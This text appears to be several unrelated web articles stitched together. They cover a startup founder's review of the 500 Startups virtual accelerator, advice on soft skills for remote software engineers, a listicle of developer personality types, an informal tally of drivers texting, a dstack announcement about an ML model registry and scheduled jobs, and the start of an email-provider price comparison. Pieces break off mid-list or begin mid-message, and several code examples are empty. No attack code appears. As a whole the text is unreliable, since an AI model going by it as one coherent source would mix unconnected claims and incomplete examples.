<li><strong>Social events (~1 hr / wk) </strong>-</li>
<li>we tried to do at least one “happy hour” per week. As these were at different times for all the founders in the program (9am for SF, 12pm for me, and evening for Europe), they weren’t usually centered around drinking, but more getting-to-know you games, trivia, and other icebreakers.</li>
<li><strong>Mentor requests (~1 hr / wk)</strong> - 500 Startups has an incredible network of mentors. As a founder, you can either request to meet with a specific mentor, or just put out a general ask to be matched with a mentor. We were blown away by the quality of mentors and advice we received here. Now that the official programming is over for us and my calendar has a little more free time, I intend to take double advantage of the mentor network</li>
<li><strong>Pitch practice (~8hrs / 4 mos) - </strong>The pitch practice is only around pitch events &amp; Demo Days, but super helpful when needed.</li>
<li><strong>Investor office hours (~8hrs / 4 mos) - </strong>Investors have office hours throughout the program, which is a great way to meet investors and get feedback before actually programming.</li>
</ul>
<p><img src="https://blog.sendspark.com/hubfs/Google%20Drive%20Integration/Blog%20-%20500%20remote%20first%20accelerator.png" alt="500 Startups Batch 27 Founders"></p>
<h3><strong>Additional Events:</strong></h3>
<ul>
<li><strong>Sales Bootcamp </strong>- This was a mini bootcamp designed to help us nail our selling strategy. We spent 3 day refining our target market, value proposition, and outreach strategy. At the end, we launched an outbound email campaign (featuring a Sendspark video) and landed our biggest customer at the time.</li>
<li><strong>“Sneak Peak” Pitch Event </strong>- We had a “sneak peak” pitch event, which was a bit of a practice Demo Day. This gave us a chance to work on our pitch and get tons of feedback &amp; introductions to investors before the Demo Day.</li>
<li><strong>VC Unlocked </strong>- This is a separate program that 500 Startups also runs, which helps emerging VC fund managers accelerate their careers. 500 Startups founders met with some of the VCU students, so that we could both practice investor conversations.</li>
<li><strong>Demo Day</strong> - For us, Demo Day is not until February, so I can’t speak much on this here. However, I will say that our team really appreciated that Demo Day was not the big focus on the 500 startups program. Instead, we spent the four months focused on building our company.</li>
</ul>
<h3><strong>My thoughts on the 500 Startups virtual programming</strong></h3>
<p>500 Startups does a great job on making sure that we have all of the programming and check-ins we need, without overdoing it. Very few events are required, and the ones that are, like the Investment Lead and EIR meetings, are hyper-personalized to our company, so they are incredibly valuable.</p>
<h2><strong>Shoutout to especially amazing people</strong></h2>
<p>As I’m writing this, I can’t resist giving special shoutouts to the people who made 500 Startups experience exceptional for us:</p>
<ul>
<li><a href="https://www.linkedin.com/in/jessicahtan/" target="_blank" rel="noopener">Jess Tan</a> for believing in us early on, and being there every step of the way as our investment lead.</li>
<li><a href="https://twitter.com/timurdaudpota?lang=en" target="_blank" rel="noopener">Timur Daudpota</a>, for being the best EIR we could have asked for. He pushed us just the right amount, and was instrumental in our growth.</li>
<li><a href="https://www.linkedin.com/in/sarahstaatz/" target="_blank" rel="noopener">Sarah Staatz</a>, took the reigns of program manager right as our program began. She dove head first into the fire, and was a constant source of energy and positivity throughout the program.</li>
<li><a href="https://www.linkedin.com/in/danlevin1/" target="_blank" rel="noopener">Dan Levin</a> was our “buddy,” and despite being the president of multi-million dollar company, took time to meet with us every two weeks to answer every question we wouldn’t have thought to ask</li>
<li>The other investment leads (<a href="https://www.linkedin.com/in/kateseledets/" target="_blank" rel="noopener">Kate</a>, <a href="https://www.linkedin.com/in/nkhera/" target="_blank" rel="noopener">Neha</a>, <a href="https://www.linkedin.com/in/claytonbryan/" target="_blank" rel="noopener">Clayton</a> and <a href="https://www.linkedin.com/in/amit-s-bhatti-1o1/" target="_blank" rel="noopener">Amit</a>) who were always there for pitch practice and all kinds of advice</li>
<li><a href="https://www.linkedin.com/in/timchae/" target="_blank" rel="noopener">Tim Chae</a> for dropping all of the knowledge bombs and new perspectives for thinking about things</li>
<li><a href="https://www.linkedin.com/in/ablumey/" target="_blank" rel="noopener">Aaron Blumenthal</a> for being a wealth of knowledge for all things growth and fundraising - and never holding back his advice</li>
<li><a href="https://www.linkedin.com/in/natalieriso/" target="_blank" rel="noopener">Natalie</a>, <a href="https://www.linkedin.com/in/zinamoukheiber/" target="_blank" rel="noopener">Zina</a>, and <a href="https://www.linkedin.com/in/tracybarba/" target="_blank" rel="noopener">Tracy</a> on the 500 Startups Marketing team for going above and beyond to use and promote Sendspark</li>
<li>The previous batch alums for always making time for in-program founders when we had questions</li>
<li>The mentors for going above and beyond to dig deep and think through tough problems with us.</li>
<li>All of the <a href="https://500.co/blog/meet-the-startups-in-500s-first-fully-virtual-accelerator/" target="_blank" rel="noopener">Batch 27 founders</a> with us (too many to list here), for always providing ideas and support</li>
<li>And a special shout out to <a href="https://app.pineappleapp.io/userStory/ijzL7PdqiPfH9oFdoH7J" target="_blank" rel="noopener">David</a> and <a href="https://app.pineappleapp.io/userStory/7TOvg50rlPSCZB2ebFj2" target="_blank" rel="noopener">Ollie</a> from <a href="https://www.pineappleapp.io/" target="_blank" rel="noopener">Pineapple</a> for featuring me in their marketing video 🤩</li>
</ul>
<h2><strong>So, did we hit our initial 500 Startups goals?</strong></h2>
<p>Yes! Between May and now, we made huge progress on all of our goals:</p>
<h3><strong>1. Team</strong></h3>
<p>Perfecting our team was our first focus for 500 Startups. We hired an exceptional CTO, and offered our incredible part-time software developers full-time positions. We also hired a content marketing intern to help us create customer welcome videos (using Sendspark!) and blog content.</p>
<h3><strong>2. Product</strong></h3>
<p>After Team, our next focus was Product. High level, our goal was to “build a product people love.”</p>
<p>Our KPIs have been mostly around usage and retention.</p>
<p>Specifically, we were looking at…</p>
<ul>
<li>How many new sign ups successfully record and share videos?</li>
<li>How many videos are people recording per week?</li>
<li>What is …</li></ul></span></p></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>

We're available to answer any questions. - &nbsp;- Your devoted BE team 😘"</p><p>The second message is much more clear and helpful. It is direct and addresses questions the FE team might have. This allows them to iterate upon it without confusion, leaving a strong impact within their hearts. They will remember how eloquent you are!</p><h2 id="ask-questions-">Ask questions!</h2><p>You have doubts? Ask. You don’t know? Ask. Most of the time you will realize that your team doesn’t know either!</p><p>Continuing in a direction where you have doubts and misunderstanding will make your colleagues grumpy and your results won’t be up to the expectations. In this situation, nobody wins - not you, not the person expecting you to finish your work.</p><h2 id="be-simple">Be simple</h2><p>Ever read a book with an exaggerated style? You suddenly realize you’ve been reading descriptions for 2 pages and yet you're still not able to figure out what the scene is actually about? That’s <em>exactly </em>what’s happening when your code is not relevant to the context of the project’s scope.</p><p><strong>Simplicity is hard.</strong> Simplicity is having a clear idea of the requirements with a straightforward implementation and avoiding tons of useless overthinking. It's keeping the code flexible enough to be easily understandable, rewritten or extended. All of this while keeping the cognitive overhead 'light', is <strong><em>hard</em></strong>. </p><p>Achieving simplicity demonstrates the ability to see clearly through a complex problem while keeping in my mind the whole picture of the project.</p><p>In all, presenting an over-engineered solution, or “a rocket that kills ants” as my colleague Diogo elegantly says, only flatters your ego. It doesn’t demonstrate a clear understanding of the application, the problem it solves, or its requirements. In the end, you will make your peers' days worse, as they will have to deal with this solution or spend a lot of time reviewing your PRs. Nobody wins. </p><p>On the other hand, presenting a very simple but elegant solution that everybody understands will not only make your own life easier, but also make your goal achievable.</p><figure><img src="https://res-2.cloudinary.com/hepw4b4yn/image/upload/q_auto/v1/ghost-blog-images/How-to-impress-as-a--remote--software-engineer-1-1.png" alt="emojis to help you communicate better"></figure><h2 id="be-humble">Be humble</h2><p>Humility is taking feedback, appreciating what your peers do better than you, and helping them when they need it. It's essential for your own improvement as a colleague and as a software engineer.</p><p>Your company doesn't make money from your ego! You’ll be more valuable if you take feedback as challenges to overcome, rather than personal attacks. Once those challenges are no more, you are already more valuable :)</p><p>Your company, your peers, your projects, and you yourself evolve. Everything is changing constantly. Staying humble makes you more aware of those changes. Be more conscious and intentional about how you communicate with and perceive others. This helps you be more precise and in tune with your personal goals as well as the team's at any moment in time. It's the key to staying more open-minded and being able to see things differently.</p><h2 id="own-your-mistakes">Own your mistakes</h2><p>The art of taking ownership of your mistakes is amazing. If I’ve made a mistake, I make my team aware of it. Everybody knows what’s going on then and they might even want to help. If you own your mistake, the consequences are never as severe as if you'd tried to hide it. Everybody can have a bad day, and that’s okay. The more you hide your faults, the more severely you'll be judged as time passes and things get worse! If everybody in the team shares the mistakes they've made, it creates an environment of support and solutions that is productive, safe and positive for you and your team.</p><h2 id="to-conclude">To conclude</h2><p>As time passes you will hopefully learn those soft skills by yourself. So learn as much as you can. The more you learn, the more you will see that the things you know are connected. This will improve your creativity in solving problems, finding elegant solutions, understanding others and communicating!</p><p>If there are three things to keep from this article they are: </p><ul><li><strong>Be open-minded </strong></li><li><strong>Learn </strong></li><li><strong>Be empathetic</strong></li></ul><p>You will impress in ways you don’t expect.</p>

10 Different Types of Developers You’re Likely to Find </h2>

<div>
<p><span>I’ve met many types of developers throughout the years building different products with <a href="https://altar.io/" target="_blank" rel="noopener noreferrer">Altar.io</a>. </span><span>The one important lesson I’ve learnt along the way is:</span></p>
<blockquote id="33ac">
<p><strong>Don’t look for the perfect developers, look for a balanced&nbsp;team.</strong></p>
</blockquote>
<p>That’s our sweet spot for one reason: there is no such thing as perfection and <strong>building a good product is never a one-man-show</strong>.</p>
<p><span>Creating and keeping a balanced dev team is a very challenging art. This is due to these two characteristics of developers: </span></p>
<ol>
<li><span>Generally speaking, they are not the most skilled communicators</span></li>
<li><span>They tend to be fiercely competitive, especially when it comes to tests of intellect.</span></li>
</ol>

<p><span>The Average Coder is perhaps <strong>the most common</strong> type of developer. He might sell himself in different ways, but he tends to be average in everything he does – with the exception of gaming. He has <strong>average standards</strong> and <strong>mediocre ambition</strong>, he wants a <strong>predictable</strong> workflow in his <strong>backlog</strong> to deliver it quietly and he’s not very keen on bug fixing because, in his point of view, that means moving back in his backlog.</span></p>

<p><b>Should you hire this developer?<br>
</b><span>Being the most common archetype, the Average Coder is the easiest to get in the market. Eventually, you’ll be hiring some Average Coders in your team. It’s important, however, that they don’t come aboard until your developer team is at least 20-strong.</span></p>
<p><span><strong>Note</strong>: we don’t have average coders at <a href="https://altar.io/" target="_blank" rel="noopener noreferrer">Altar.io</a>.</span></p>

</b><span><a href="https://hbr.org/1993/03/the-discipline-of-teams-2" target="_blank" rel="noopener noreferrer">Small teams need commitment</a>. This person will never question your decisions or suggestions, which means they are <strong>not committed</strong>.</span></p>

</div>
</figure>
<p><span>The Wolf is a <strong>dream developer</strong>, totally unbalanced and eternally optimistic. You will try to include him in all projects because he’s hyper-productive, codes very quickly and will never deliver less than solid code.</span></p>
<p>He makes <strong>great architecture decisions.</strong> He is always aware of the best practices and new technologies. Not only that he also already tried and benchmarked different architectural decisions – before he presents the solution to be adopted.</p>
<p>He is a good team player, talks when necessary and understands and respects business and product decisions. Is he/she a problem solver? Well, you’ll never be worried when one is around because <strong>things will be solved</strong>. These types of developers also have the rare ability to read your mind and predict your needs, which is kind of weird but indeed handy.</p>
<h4>Comic Situation:</h4>
<h4><img loading="lazy" src="https://altario-wordpressmedia.s3.eu-west-1.amazonaws.com/wp-content/uploads/2019/11/01175925/Screenshot-2020-04-01-at-18.57.58.png" alt="10 Different Types of Developers You’re Likely to Find - Comic #2 The Wolf" width="679" height="515"></h4>
</div>
<div>
<p><b>Should you hire The Wolf?<br>
</b><span><strong>Positively!</strong> You should find all the Wolves in town but sadly there aren’t many.</span><span><br>
</span><span>Unlike 80% of developers, The Wolf understands business and product priorities – even if they don’t meet his dream roadmap. He’ll try to help as much as possible to get the team together to achieve your goals. Only 1 developer out of 1000 is probably a Wolf</span><span>.</span><span> We have a good eye for Wolves, so we proudly have more than a few working at <a href="https://altar.io/" target="_blank" rel="noopener noreferrer">Altar.io</a>.</span><strong>&nbsp;</strong></p>
<p><b>Warning if you consider hiring one:<br>
</b><span>Wolves are ambitious and constant learners, so their <strong>stability and loyalty will quickly disappear if they’re not feeling stimulated</strong> with projects or by their peers. They also tend to be optimistic in their judgement of projects and have difficulty saying ‘no’ – so sometimes they’ll accept work and timelines that are nearly impossible to achieve.</span></p>

<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*hctp30S7JsD_XSPBKQG0mg.png" alt="Types of Developers You're Likely to Find #3: The Narcissus" width="800" height="785" data-src="https://cdn-images-1.medium.com/max/800/1*hctp30S7JsD_XSPBKQG0mg.png"></p>
</div>
</figure>
<p><span>This type of developer is very <strong>similar to The Wolf.</strong> However, he comes with significant differences that have a tremendous impact – possession of a much <strong>bigger ego</strong> and <strong>poorer communication</strong> and team skills.</span></p>
<p>While most developers are highly competitive, the Narcissus takes it to a higher level. He wants to be recognized as a genius to the point that he often falls in his own trap: he <strong>tends to over-engineer</strong> simple things to create the “perfect systems” and <strong>refuses to compromise.</strong> He always refactors code to be fully irrepressible even if this takes 1000% of the expected time and even if it is not exactly what you wanted.</p>
<p>In a nutshell, he goes with Maximus motto: “<strong>What we do in life, echoes in eternity!</strong>” The best way to manage a Narcissus is to present them with a very specific challenge and discuss the solution in detail. Just like the Wolf, they’ll find the best solution, within budget and in a very reasonable timeframe. He is a nice chap and tends to be smooth with his fellow developers – although he often recreates their code to openly display who’s in charge.</p>

</div>
<div>
<p><b>Should you hire this developer?<br>
</b><span>You should only have one in your team – but you’ll need someone strong enough to keep them in check. But remember he doesn’t like to be controlled because he feels overshadowed.</span></p>
<p><b>Warning if you consider hiring one:<br>
</b><span>If you give him big challenges and let him decide alone he will over-engineer as much as he can, because he wants to appear as the one-man-maestro that architectured and executed a masterpiece alone.</span></p>

<p><span>Mickey is an Idealist, he only thinks about solutions in a quintessential form and has a very <strong>limited capability to compromise</strong>.</span></p>
<p><span>He proposes to adopt a new framework/architecture because the project will be more modular and scalable.</span></p>
<p><span>He wants to migrate the whole system to this new standard. He will disrespect the fact that it doesn’t have a meaningful community yet. He also won’t care that his peers will not know how to work with it.</span></p>
<p><span>Discussions about budget and timings will be rebuffed with arguments about how vital it is that their preference is chosen – and that you’d understand why “if you had vision”.</span></p>
<p>His motto is:</p>
<blockquote id="fbee">
<p>“Discard any language/framework that is &gt; 3 months OR has a community &gt; 300 developers OR &gt; 3 developers in your team heard of it”.</p>
</blockquote>

</div>
<div>
<p><b> Should you hire this developer?<br>
</b><span>These types of developers are always <strong><a href="https://www.forbes.com/sites/quora/2018/03/01/how-to-keep-up-to-date-as-a-software-developer/#1e4eb4776017" target="_blank" rel="noopener noreferrer">on top of the latest trends</a>. </strong>They know all the new features of the new versions of all bleeding-edge frameworks. Like the Narcissus, you should only have one of these in a bigger team.</span></p>
<p>With the correct structure around them, they might make a difference, finding the best architectural option that no one else thought about.</p>
<p><b>Warning if you consider hiring one:<br>
</b><span>He likes to bring disruption but <strong>you’ll need to moderate the speed of new adoption</strong>. When you challenge his ideas for change, he’ll endlessly argue with you to try to prove he’s correct: It’s important to remember while the facts and figures they’ll sprout are correct (i.e. faster, more scalable, more modular, etc) it doesn’t necessarily mean it’s a good idea to adopt it at this stage.</span></p>
<p>Also remember, if you aren’t using the latest – and riskier – technologies, they’ll soon lose interest in the project. If they have the space to shine they will be loyal – but otherwise don’t expect too much commitment to you or the project.</p>

<p><span>With their <strong>small ego</strong>, <strong>limited ambition</strong> and <strong>hatred of the spotlight</strong>, this type of developer is the opposite of a Narcissist. If at all possible, he’ll work from home. If he makes it into the office, you’ll find him hidden in a quiet spot you didn’t know existed He will try, desperately, to avoid meetings. </span></p>
<p><span>While his work is diligent, it’s bland and unexciting. He will never surprise you neither for the positive or the negative side.</span></p>

<div>
<p><b> Should you hire this developer?<br>
</b><span>Personally, I don’t have an opinion about The Shy One because we tend to have strong characters in our team at <a href="https://altar.io/" target="_blank" rel="noopener noreferrer">Altar.io</a>. But if you hire a Shy One, you can be assured of one thing – they won’t bring disorder to your team dynamics or disrupt the workflow or product.</span></p>
<p><b>Warning if you consider hiring one:<br>
</b><span>They’re shy by nature and not great communicators. As a result, often what’s delivered will be outside the project’s specifications because they ‘<strong>didn’t want to disturb you</strong>’.</span></p>

<p><b>Should you hire this developer?<br>
</b><span>If your team is strong enough, it’s good to have a Hitchhiker onboard. The best use for them is emergency problem solving and rough prototyping – and they’ll reach their goals far quicker than you originally thought possible. However, everything will have to be refactored afterwards. Knowing how to deal with Hitchhikers – and in particular, placing them in the right team – is something we value at <a href="https://altar.io/" target="_blank" rel="noopener noreferrer">Altar.io</a>.</span></p>
<p><b>Warning if you consider hiring one:<br>
</b><span>He will tease the idealist and the puritan on a daily basis. Also, you should never put him alone developing a big feature because he does not follow the standards or documentation. While their code will (somehow) work, it will be difficult for their peers to understand and change. </span></p>
<p><span>Hitchhikers are normally loyal by default but highly unstable – the result of which means if they receive a better offer, they’ll be out the door.</span></p>

<p>I just finished a run in my neighborhood. Took about 70 minutes. To pass the time, I decided to keep track of how many drivers I ran by that were texting and driving. Based on my very professional, scientific results, I have concluded that basically everyone is spending a large portion of their drives texting.</p>



<h2>Experimental methodology</h2>



<p>I kept track of three numbers during my run:</p>



<ol><li>How many people were texting</li><li>How many people I passed total</li><li>How many people were doing something critical when I passed</li></ol>



<p>I didn’t count anyone if I couldn’t see inside the windshield or if I was too distracted to look. And by critical, I mean the driver was doing something that would be absolutely suicidal to text during, like taking a fast corner in traffic. And everyone I counted for #1 was full-on, eyes down, engrossed in a text. No glances. So here’s what I got.</p>



<figure><img data-attachment-id="1319" data-permalink="https://www.lutherwealth.com/everyone-is-lying-about-texting-and-driving/driving-844132_1280/" data-orig-file="https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?fit=1280%2C851&amp;ssl=1" data-orig-size="1280,851" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="driving-844132_1280" data-image-description="" data-medium-file="https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?fit=300%2C199&amp;ssl=1" data-large-file="https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?fit=525%2C349&amp;ssl=1" loading="lazy" width="525" height="349" src="https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?resize=525%2C349&amp;ssl=1" alt="An idiot, being an idiot, texting and driving" srcset="https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?resize=1024%2C681&amp;ssl=1 1024w, https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?resize=300%2C199&amp;ssl=1 300w, https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?resize=768%2C511&amp;ssl=1 768w, https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?w=1280&amp;ssl=1 1280w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?resize=1024%2C681&amp;ssl=1 1024w, https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?resize=300%2C199&amp;ssl=1 300w, https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?resize=768%2C511&amp;ssl=1 768w, https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?w=1280&amp;ssl=1 1280w" data-lazy-src="https://i2.wp.com/www.lutherwealth.com/wp-content/uploads/2020/11/driving-844132_1280.jpg?resize=525%2C349&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>This person is an idiot</figcaption></figure>



<h2>Results</h2>



<ol><li>13 drivers texting</li><li>114 drivers observed</li><li>13 drivers doing something too dangerous to text</li></ol>



<p>So, if you subtract the drivers engaged in critical activities, 13% of drivers I ran by were texting and driving during non-critical driving.</p>



<h2>Analysis</h2>



<p>Let’s think about what this means. Here are some scenarios that could lead to results like this:</p>



<ol><li>13% of drivers spend 100% of their road time engrossed in Russian novels on their phone.</li><li>26% of drivers spend half of their road time playing Angry Birds. Poorly.</li><li>All drivers spend about 13% of their road time swiping Tinder for true love.</li></ol>



<p>These scenarios are all pretty terrible. Also, everyone I know complains about texting and driving, but these numbers are telling me that most of you are lying about not doing it yourself.</p>



<h2>Final notes</h2>



<p>About half of my running route today was through neighborhoods where kids are out. About a mile of it was in a school zone with the school zone lights activated. On about a third of my runs of one hour or longer, I get bumped by a car in a crosswalk.</p>



<p>One of the 13 “too dangerous to text” exclusions was actually texting. It was a high speed corner, in rush hour traffic. Head fully buried. I almost excluded him from all three counts, simply because I’m assuming he will be dead by the time this publishes.</p>



<p>It’s possible that a few of my texters were actually just looking down at the speedometer or something. But it shouldn’t be consequential to my 13% calculation. If, during an hour ride, a driver looks down at the speedo / radio / AC once every minute for half a second, that’s thirty seconds per hour, or 1 out of 120 drivers per hour “honestly” looking down. So maybe my first number should be 12 instead of 13, no big deal. And if you’re looking down more or longer than that, you’re distracted.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>Using ML models to predict and solve business use cases currently is a very lengthy and iterative process. Data scientists and engineers need to tackle a lot of challenges continuously, from building and improving the models to deploying them and using them in production applications for tangible utility. A significant amount of time and energy is spent on development, deployment, and maintenance which otherwise could be better used in training and improving the models.</p>
<p>We are today releasing two new features in dstack that we believe is a first step for us to improve the situation.</p>
<ol>
<li>Push and pull models directly from Python to build a model registry</li>
<li>Schedule jobs written in Python to run models against live data</li>
</ol>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604665792741/_QMzQm0hc.jpeg?auto=format&amp;q=60" alt="dstack workflow.jpeg"></p>
<p>Here’s the description of the steps shown in the diagram:</p>
<ol>
<li>The data scientist pushes the trained model to the dstack’s model registry from a Jupyter notebook, a script, or any ML Ops solution.</li>
<li>The data scientist creates a job on the dstack server.</li>
<li>The job pulls the model from the dstack’s model registry.</li>
<li>The job loads the data from a data warehouse, and pass the data to the model.</li>
<li>The job makes plots and pushes them into dstack as reports.</li>
<li>The business user accesses the report on the dstack’s server.</li>
</ol>
<p>These new features combined with the existing ability to build interactive data reports with Python and other open-source libraries (see  <a target="_blank" href="https://blog.dstack.ai/dstackai-is-now-open-source-an-easy-way-to-build-data-applications">open-source announcement</a> ) will simplify the creation of interactive data applications for business-specific use cases (e.g., modeling, pricing, revenue prediction, controlling KPIs, manufacturing issues and others.)</p>
<h2 id="push-and-pull-ml-models-to-dstack-model-registry">Push and pull ML models to dstack Model Registry</h2>
<p>The ability to push and pull models to dstack Model Registry with the Python API enables one to decouple model development from application development. You can now host your models within the dstack Model Registry in the same way that you host your docker images in the docker registry.</p>
<p>It’s as simple as training the model and pushing it to dstack to then pull it later from the dstack server. This provides an idiomatic approach for versioning and managing different instances of your model. In addition, this enables you to isolate model creation from model consumption. Currently, dstack supports models made with Tensorflow, PyTorch, and Scikit-learn.</p>
<p>Let’s say you want to build an application to predict the churn of your customers to be used by sales. In this toy example, let’s build this model, and push this model to dstack Model Registry. 
We start by importing the libraries required - scikit-learn and pandas to create ML models, and dstack to push/pull the model. </p>
<pre><code>




model = LogisticRegression() 
result = model.fit(X_train, y_train)

prediction_test = model.predict(X_test)
</code></pre>
<p>Once your model is trained and ready, you can push it to dstack Model Registry simply using the ds.push function. </p>
<pre><code><span>import</span> dstack <span>as</span> ds

ds.push(<span>"churn_demo/lr_model"</span>, model, “Some description of your model”)
</code></pre>
<p>The first argument of the function <em>ds.push</em> is the name of the stack which stores the ML model in the dstack server. </p>
<p>Notice how we used the ds.push function to push the ML model <em>churn_demo/lr_model</em> and store it in dstack Model Registry. As you continue to work on the model, you can also repeatedly push the improved model to dstack which will track all versions of the model. </p>
<p>If you want to retrieve this model later on – to share it with others or to use it in a Python application, you can pull it back from dstack the following way: </p>
<pre><code>my_model = ds.pull(<span>"churn_demo/lr_model"</span>)
</code></pre>
<p>In this case, you’ll get the same instance of the <em>LinearRegression</em> model which you pushed to Model Registry. Once you’ve pulled the model, you can use it right away. </p>
<p>You can also pull a specific revision of the model using the revision ID or a parameter value: e.g.,  </p>
<pre><code>my_model = ds.pull(<span>"churn_demo/lr_model"</span>, params={<span>"someParam"</span>: someValue, <span>"someOtherParam"</span>: someOtherValue})
</code></pre>
<p>The model itself is stored on the dstack server in the format based on the type and the framework used to create the model. This can be either weights or pickled objects. You can control the API if both options are available. Here is how the pushed model looks like  <a target="_blank" href="https://dstack.ai/riwaj/churn_demo/lr_model">https://dstack.ai/riwaj/churn_demo/lr_model
</a>. You can also find the screenshot of the Model Registry below.  </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604670407744/u8IUifQeY.png?auto=format&amp;q=60" alt="Model registry.png"></p>
<h2 id="schedule-jobs-to-run-ml-models-on-live-data">Schedule jobs to run ML models on live data</h2>
<p>Now, imagine that you want to call your model regularly on the enterprise data – e.g. to build an interactive data report. In this case, you can create a dstack Job to run this code at a regular schedule. To do this, you can go to the “Jobs” tab in your dstack server application.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604668265473/8xkzM9_QI.png?auto=format&amp;q=60" alt="jobs screen shot.png"></p>
<p>You’ll see a light code editor where you can post the code of your job. The job will query the enterprise data (e.g. from a data source, or a data warehouse), pull the ML model (by its name from the Model Registry), do prediction, pass it to a visualization library, and then push the resulted visualization or data to dstack to make an  <a target="_blank" href="https://blog.dstack.ai/publish-track-and-share-data-analysis-results-without-development-skills">interactive report</a>.</p>
<p>In the job, you can pull your model to use together with data and visualization libraries. </p>
<pre><code>loaded_model = ds.pull(<span>"churn_demo/lr_model"</span>)
</code></pre>
<p>Before passing the data to the model, you might filter and transform the data to make sure that the relevant data is used to build the interactive report. </p>
<pre><code>




y_pred = loaded_model.predict(X)
</code></pre>
<p>Also within your Jobs, you can use the dstack library to build an interactive report. The dstack library allows you to pass parameters with every visualization or data frame. Once pushed, multiple visualizations and data frames within a single stack, are automatically compiled into an interactive application where the user may change parameters and see the report updating accordingly. </p>
<pre><code><span>import</span> dstack <span>as</span> ds

frame = ds.frame(<span>"churn_demo/app"</span>)



frame.add(y1_pred, params={ <span>"Region"</span>: reg, <span>"Month"</span>: mon,
                      <span>"Churn Prediction"</span>: ds.tab() })


frame.push()
</code></pre>
<p>In our toy example, we use the following dstack’s functions above. </p>
<ol>
<li>ds.frame defines the name of the application, in this case, <em>churn_demo/app</em>. </li>
<li>frame.add offers the UI rules for the application. You can see how parameters like ‘Region’, and ‘Month’ are passed to the frontend to create interactivity in the report. </li>
<li>frame.push pushes the frame to the server where the report is rendered. </li>
</ol>
<p>Notice how a function <em>ds.tab</em> was added to the frame to define a tab “Churn Prediction”. This function enables you to have a multi-page report. </p>
<p>For the sake of this simple example, let us assume that in our report apart from “Churn Prediction”, we also want to have another tab with a visualization, e.g. of the number of licenses purchased by a selected customer per recent month. To have it, we’ll create a plot, define a new tab using <em>ds.tab</em>, and then add it as an attachment within the same frame, and push the frame to dstack. </p>
<pre><code>



frame.add(fig, params={“Company”: company, “Licenses”ds.tab()})

frame.push()
</code></pre>
<p>Once you wrote the code of your job, you can now configure how regularly you want to update the report.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604668511305/LVQpzNJWZ.png?auto=format&amp;q=60" alt="unscheduled job.png"></p>
<p>With this, you can start the job by pressing on the Run button that is available on the top-right hand corner of your screen. 
Once the job has finished, you can see the report it has pushed in your stacks.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604668566923/y89wRA7Fk.png?auto=format&amp;q=60" alt="stacks.png"></p>
<p>If you open your report <em>churn_demo/app</em> from our example, it will look like the following: </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604668609768/l03JJSJ1k.png?auto=format&amp;q=60" alt="churn_app.png"></p>
<p>The user can use UI controls compiled out of the parameters (used in frame.push) to play with the report switch between tabs. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604668640597/bxnOURBMk.png?auto=format&amp;q=60" alt="licenses.png"></p>
<p>The dstack may help to use ML models and regular jobs to predict customer churn, lifetime value of a customer, dynamic pricing, identifying industrial issues, and many more.</p>
<p>Here is the application built for our toy example to predict the churn rate of some imaginary customers using synthetic data.  <a target="_blank" href="https://dstack.ai/riwaj/churn_demo/app">https://dstack.ai/riwaj/churn_demo/app</a> </p>
<p>Note, even though the links above refer to the hosted server, anyone can use dstack to run locally or on dedicated servers. The dstack framework is  <a target="_blank" href="https://github.com/dstackai/dstack">open-sourced</a> under Apache 2.0.</p>
<p>You can also check the  <a target="_blank" href="https://docs.dstack.ai/tutorials/machine-learning-models">documentation</a> with tutorials and guides on ML models, jobs, and reports work. </p>

    <p>Most businesses need to send an email from time to time. Marketing platforms aside, what if you want to send it on your terms? Here’s a table comparing the common choices for starting businesses and indie makers.</p>

<p>I looked at <strong>leading transactional email providers</strong> and tried to compare them in what they give you <strong>for free</strong>, what they cost per 10 000 emails/month, 20 000 emails/month, 50 000 emails/month, and for <strong>a dedicated IP address</strong>. It focuses on initial costs where the business is starting up. I am including a price for one milion emails for fun, profit, and growing B2C startups.</p>

<p>This table is put together in <strong>November 2020</strong>. Please let me know if this needs an update.</p>

<p>Notes:</p>

<p>The table compares limits and the minimum payment but does not compare other advantages of higher volumes. Some price points might already trigger a higher plan with more emails.</p>

